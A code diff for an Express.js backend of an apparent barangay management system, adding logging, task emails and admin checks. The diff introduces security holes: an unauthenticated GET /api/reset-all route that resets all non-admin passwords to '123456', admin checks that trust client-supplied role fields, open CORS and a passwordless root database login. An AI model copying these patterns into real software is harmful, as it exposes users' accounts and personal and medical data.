@@ -1,4 +1,4 @@
-require('dotenv').config({ path: '../.env' });
+require('dotenv').config();
 
 const express = require('express');
 const helmet = require('helmet');
@@ -7,53 +7,46 @@ const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
 const mysql = require('mysql2');
+const bcrypt = require('bcryptjs');
 
-// 🌟 IMPORT ANG HELPER FUNCTION PARA SA LOGS & EMAILS
+// 🌟 IMPORT ANG HELPER FUNCTION PARA SA LOGS
 const { addActivityLog } = require('./controllers/logsController'); 
+
+// 🌟 IMPORT ANG EMAIL HELPER AT BACKGROUND SCHEDULER
 const { sendEmail } = require('./utils/emailHelper'); 
 const { startTaskScheduler } = require('./utils/scheduler'); 
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 
 // ============================
-// MIDDLEWARES (KASAMA NA ANG VERCEL AT RAILWAY)
+// MIDDLEWARES
 // ============================
 app.use(helmet({ crossOriginResourcePolicy: false }));
-
-app.use(cors({
-    origin: [
-        'http://localhost:8080', 
-        'http://127.0.0.1:8080',
-        'https://carait-project-production.up.railway.app', 
-        'https://carait-project-gelmarcutes-projects.vercel.app' // VERCEL LINK MO
-    ],
-    credentials: true
-}));
-
+app.use(cors());
 app.use(express.json());
 
 // ============================
-// DATABASE CONNECTION POOL
+// DATABASE CONNECTION (MySQL) - UPDATED TO CONNECTION POOL
 // ============================
 const db = mysql.createPool({
-  host: process.env.DB_HOST || 'localhost',
-  user: process.env.DB_USER || 'root',
-  password: process.env.DB_PASSWORD || '',
-  database: process.env.DB_NAME || 'brgy_system',
-  port: process.env.DB_PORT || 3306,
+  host: 'localhost',
+  user: 'root',
+  password: '',
+  database: 'brgy_system',
   dateStrings: true,
   waitForConnections: true,
   connectionLimit: 10,
   queueLimit: 0
 });
 
+// Test connection para makita sa terminal kung okay ang database
 db.getConnection((err, connection) => {
   if (err) {
       console.error('❌ MySQL Connection Error:', err.message);
   } else {
       console.log('✅ Connected to MySQL database via Connection Pool!');
-      connection.release(); 
+      connection.release(); // Ibalik agad ang connection sa pool
   }
 });
 
@@ -94,17 +87,33 @@ app.use('/api/auth', authRoutes);
 // ============================
 app.post('/api/solicitations', upload.fields([{ name: 'documentImage', maxCount: 1 }, { name: 'personImage', maxCount: 1 }]), (req, res) => {
   const data = req.body;
+  
+  // 🌟 TRACKER: I-check kung may laman ang pinapasa ng frontend
+  console.log("📝 NEW SOLICITATION DATA RECEIVED:", data);
+  console.log("📁 UPLOADED FILES:", req.files);
+
   const docFile = req.files?.documentImage?.[0]?.filename || null;
   const personFile = req.files?.personImage?.[0]?.filename || null;
+
   const baseUrl = `${req.protocol}://${req.get('host')}`;
   const docUrl = docFile ? `${baseUrl}/uploads/${docFile}` : null;
   const personUrl = personFile ? `${baseUrl}/uploads/${personFile}` : null;
 
-  const sql = `INSERT INTO solicitations (userId, event, date, request, venue, requisitorName, contactNo, requisitorDistrict, requisitorBarangay, remarks, documentImageUrl, personImageUrl, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')`;
-  const values = [data.userId || null, data.event, data.date, data.request, data.venue, data.requisitorName, data.contactNo, data.requisitorDistrict, data.requisitorBarangay, data.remarks, docUrl, personUrl];
+  const sql = `
+    INSERT INTO solicitations
+    (userId, event, date, request, venue, requisitorName, contactNo, requisitorDistrict, requisitorBarangay, remarks, documentImageUrl, personImageUrl, status)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')
+  `;
+  const values = [
+    data.userId || null, data.event, data.date, data.request, data.venue, data.requisitorName,
+    data.contactNo, data.requisitorDistrict, data.requisitorBarangay, data.remarks, docUrl, personUrl,
+  ];
 
   db.query(sql, values, (err, result) => {
-    if (err) return res.status(500).json({ error: err.message });
+    if (err) {
+      console.error('❌ MYSQL ERROR SA SOLICITATION:', err.message);
+      return res.status(500).json({ error: err.message });
+    }
     addActivityLog(`Added a new solicitation for ${data.requisitorName}`, data.requisitorName || 'System');
     res.status(201).json({ message: 'Solicitation created successfully', insertId: result.insertId });
   });
@@ -140,17 +149,33 @@ app.delete('/api/solicitations/:id', (req, res) => {
 // ============================
 app.post('/api/solicitations/medical-requests', upload.fields([{ name: 'documentImage', maxCount: 1 }, { name: 'personImage', maxCount: 1 }]), (req, res) => {
   const data = req.body;
+  
+  // 🌟 TRACKER: I-check kung may laman ang pinapasa ng frontend
+  console.log("📝 NEW MEDICAL REQUEST DATA RECEIVED:", data);
+  console.log("📁 UPLOADED FILES:", req.files);
+
   const docFile = req.files?.documentImage?.[0]?.filename || null;
   const personFile = req.files?.personImage?.[0]?.filename || null;
+
   const baseUrl = `${req.protocol}://${req.get('host')}`;
   const docUrl = docFile ? `${baseUrl}/uploads/${docFile}` : null;
   const personUrl = personFile ? `${baseUrl}/uploads/${personFile}` : null;
 
-  const sql = `INSERT INTO medical_requests (userId, patientName, date, requestType, medicalIssue, contactNo, remarks, documentImageUrl, personImageUrl, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')`;
-  const values = [data.userId || null, data.patientName, data.date, data.requestType, data.medicalIssue, data.contactNo, data.remarks, docUrl, personUrl];
+  const sql = `
+    INSERT INTO medical_requests
+    (userId, patientName, date, requestType, medicalIssue, contactNo, remarks, documentImageUrl, personImageUrl, status)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')
+  `;
+  const values = [
+    data.userId || null, data.patientName, data.date, data.requestType, data.medicalIssue,
+    data.contactNo, data.remarks, docUrl, personUrl,
+  ];
 
   db.query(sql, values, (err, result) => {
-    if (err) return res.status(500).json({ error: err.message });
+    if (err) {
+      console.error('❌ MYSQL ERROR SA MEDICAL REQUEST:', err.message);
+      return res.status(500).json({ error: err.message });
+    }
     addActivityLog(`Added a new medical request for ${data.patientName}`, data.patientName || 'System');
     res.status(201).json({ message: 'Medical Request created successfully', insertId: result.insertId });
   });
@@ -187,16 +212,42 @@ app.delete('/api/solicitations/medical-requests/:id', (req, res) => {
 app.get('/api/tasks', (req, res) => {
   db.query('SELECT * FROM tasks ORDER BY createdAt DESC', (err, results) => {
     if (err) return res.status(500).json({ error: 'Failed to fetch tasks' });
-    const tasks = results.map((t) => ({ ...t, completed: t.completed === 1, archived: t.archived === 1 }));
+    const tasks = results.map((t) => ({ 
+        ...t, 
+        completed: t.completed === 1,
+        archived: t.archived === 1 
+    }));
     res.json(tasks);
   });
 });
 
 app.post('/api/tasks', (req, res) => {
   const { title, description, assignedTo, createdBy } = req.body;
+  
+  // 🌟 TRACKER: Para makita sa terminal kung ano ang data na dumating mula sa React
+  console.log("📝 NEW TASK REQUEST:", { title, description, assignedTo, createdBy });
+
   db.query('INSERT INTO tasks (title, description, assignedTo, createdBy) VALUES (?, ?, ?, ?)', [title, description, assignedTo, createdBy], (err) => {
-      if (err) return res.status(500).json({ error: `Database Error: ${err.message}` });
+      if (err) {
+          // 🌟 TRACKER: Ilalabas nito sa terminal ang eksaktong inirereklamo ng database
+          console.error('❌ MYSQL ERROR SA TASKS:', err.message);
+          return res.status(500).json({ error: `Database Error: ${err.message}` });
+      }
+
       addActivityLog(`Created a new task: '${title}' assigned to ${assignedTo}`, createdBy || 'System');
+
+      db.query("SELECT email, fullName FROM users WHERE id = ? OR fullName = ?", [assignedTo, assignedTo], (userErr, userResults) => {
+          if (!userErr && userResults.length > 0) {
+              const userEmail = userResults[0].email;
+              const userFullName = userResults[0].fullName;
+
+              const subject = `New Task Assigned: ${title}`;
+              const body = `Hi ${userFullName},\n\nA new task has been assigned to you by ${createdBy || 'the Admin'}.\n\nTask: ${title}\nDescription: ${description || 'No description provided'}\n\nPlease check the System for more details.\n\nThank you!`;
+
+              sendEmail(userEmail, subject, body);
+          }
+      });
+
       res.status(201).json({ message: 'Task added successfully' });
     }
   );
@@ -205,27 +256,79 @@ app.post('/api/tasks', (req, res) => {
 app.put('/api/tasks/:id/status', (req, res) => {
   const { id } = req.params;
   const { completed, user } = req.body;
-  db.query('UPDATE tasks SET completed = ? WHERE id = ?', [completed ? 1 : 0, id], (updateErr) => {
-      if (updateErr) return res.status(500).json({ error: 'Failed to update task' });
-      res.json({ message: 'Task updated' });
-    }
-  );
+
+  db.query("SELECT title, assignedTo FROM tasks WHERE id = ?", [id], (err, results) => {
+    if (err || results.length === 0) return res.status(404).json({ error: 'Task not found' });
+
+    const taskTitle = results[0].title;
+    const assignedTo = results[0].assignedTo || 'Unassigned';
+
+    db.query('UPDATE tasks SET completed = ? WHERE id = ?', [completed ? 1 : 0, id], (updateErr) => {
+        if (updateErr) return res.status(500).json({ error: 'Failed to update task' });
+
+        const actionText = `Completed a task: '${taskTitle}' assigned to ${assignedTo}`;
+        addActivityLog(actionText, user || 'System');
+        res.json({ message: 'Task updated' });
+      }
+    );
+  });
 });
 
 app.put('/api/tasks/:id/archive', (req, res) => {
   const { id } = req.params;
-  db.query('UPDATE tasks SET archived = 1 WHERE id = ?', [id], (updateErr) => {
+  const { user, role } = req.body;
+
+  if (role !== 'admin' && user !== 'Admin') {
+      return res.status(403).json({ error: 'Access denied: Only admins can archive tasks.' });
+  }
+
+  db.query("SELECT title FROM tasks WHERE id = ?", [id], (err, results) => {
+    if (err || results.length === 0) return res.status(404).json({ error: 'Task not found' });
+    
+    const taskTitle = results[0].title;
+
+    db.query('UPDATE tasks SET archived = 1 WHERE id = ?', [id], (updateErr) => {
       if (updateErr) return res.status(500).json({ error: 'Failed to archive task' });
+      
+      addActivityLog(`Archived task: '${taskTitle}'`, user || 'System');
       res.json({ message: 'Task archived successfully' });
     });
+  });
 });
 
 app.delete('/api/tasks/:id', (req, res) => {
   const { id } = req.params;
-  db.query('DELETE FROM tasks WHERE id = ?', [id], (deleteErr) => {
+  const { user, role } = req.body;
+
+  if (role !== 'admin' && user !== 'Admin') {
+      return res.status(403).json({ error: 'Access denied: Only admins can delete tasks.' });
+  }
+
+  db.query("SELECT title FROM tasks WHERE id = ?", [id], (err, results) => {
+    const taskTitle = (results && results.length > 0) ? results[0].title : `ID ${id}`;
+
+    db.query('DELETE FROM tasks WHERE id = ?', [id], (deleteErr) => {
       if (deleteErr) return res.status(500).json({ error: 'Failed to delete task' });
+      
+      addActivityLog(`Deleted task: '${taskTitle}'`, user || 'Admin');
       res.json({ message: 'Task deleted' });
     });
+  });
+});
+
+// ============================
+// 🌟 MAGIC RESET PASSWORDS ROUTE
+// ============================
+app.get('/api/reset-all', async (req, res) => {
+    try {
+        const newPassword = await bcrypt.hash('123456', 10);
+        db.query("UPDATE users SET password = ? WHERE email != 'gelmarpogi12@gmail.com'", [newPassword], (err) => {
+            if (err) return res.send("Error: " + err.message);
+            res.send("<h1>✅ SUCCESS! Ang password ng lahat ng users (except Admin) ay 123456 na!</h1>");
+        });
+    } catch (e) {
+        res.send("Error hashing.");
+    }
 });
 
 // ============================
@@ -234,5 +337,5 @@ app.delete('/api/tasks/:id', (req, res) => {
 startTaskScheduler();
 
 app.listen(PORT, () => {
-  console.log(`✅ Backend is running on port ${PORT}`);
+  console.log(`✅ Backend is running on http://localhost:${PORT}`);
 });
